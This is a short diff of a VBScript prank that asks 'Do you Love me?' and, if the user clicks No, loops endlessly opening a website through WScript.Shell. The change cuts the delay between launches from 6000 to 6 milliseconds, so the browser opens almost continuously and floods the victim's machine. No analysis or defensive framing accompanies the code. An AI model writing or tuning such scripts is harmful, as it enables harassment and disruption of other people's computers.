@@ -4,7 +4,7 @@ wox = msgbox("Do you Love me?",4 +64,"I Love you soo much♥")
 if wox = 7 then
 msgbox"Now face my hatred"
 do
-WScript.Sleep(6000) 
+WScript.Sleep(6) 
 Set shl = CreateObject("Wscript.shell")
 shl.run "https://joyofsatan.org/"
 WScript.Sleep(6) 
